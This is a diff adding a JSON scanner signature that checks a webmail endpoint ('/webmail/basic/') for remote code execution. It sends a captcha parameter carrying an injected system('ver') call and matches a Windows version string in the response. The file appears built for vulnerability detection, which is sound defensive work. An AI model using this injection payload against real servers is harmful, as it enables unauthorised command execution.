@@ -1,0 +1,27 @@
+{
+	"request": {
+		"method": "POST",
+		"path": "/webmail/basic/",
+		"body": "_dlg[captcha][target]=system(\\'ver\\')\\",
+		"headers": [
+			"Content-Type: application/x-www-form-urlencoded"
+		]
+	},
+	"response": {
+		"matchesRequired": 2,
+		"matches": [
+			{
+				"type": "static",
+				"pattern": "Microsoft Windows ["
+			},
+			{
+				"type": "status",
+				"code": 302
+			},
+			{
+				"type": "status",
+				"code": 200
+			}
+		]
+	}
+}
